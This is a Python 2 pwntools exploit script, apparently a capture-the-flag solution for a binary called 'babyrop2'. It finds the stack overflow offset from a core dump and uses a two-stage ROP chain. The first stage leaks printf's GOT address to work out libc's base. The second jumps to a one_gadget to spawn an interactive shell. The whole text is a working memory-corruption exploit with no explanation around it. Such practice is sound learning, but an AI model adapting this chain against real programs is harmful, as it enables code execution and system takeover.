#!/usr/bin/python2.7
#Author: Wh04m1


from pwn import *



context.log_level='info'
context(os='linux', arch='amd64')

elf = ELF('./babyrop2')
one_gadget = p64(0x44adf) # one_gadget /lib/x86_64-linux-gnu/libc.so.6

p = process(elf.path)
crash = cyclic(1024)
p.recvuntil('?')
p.sendline(crash)
p.wait()
core = p.corefile
rsp = core.rsp
offset = core.read(rsp, 4)
offset =  cyclic_find(offset)
success("Offset found @ {} bytes\n\r".format(offset))

###### ROP stage 1: leak printf and libc ######

rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop.call(elf.sym['printf'],[next(elf.search('%s')),elf.got['printf']])
rop.call(elf.sym['main'])
info(rop.dump())
p = process(elf.path)
p.recvuntil('?')
p.sendline(fit({offset:rop.chain()}))
leaked_printf = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_add = leaked_printf - libc.sym.printf
success("libc will be at {}".format(hex(libc_add)))


###### ROP stage 2: spawn shell #####

one_gadget = libc_add + u64(one_gadget)
p.sendline(fit({offset:one_gadget}))
p.interactive()
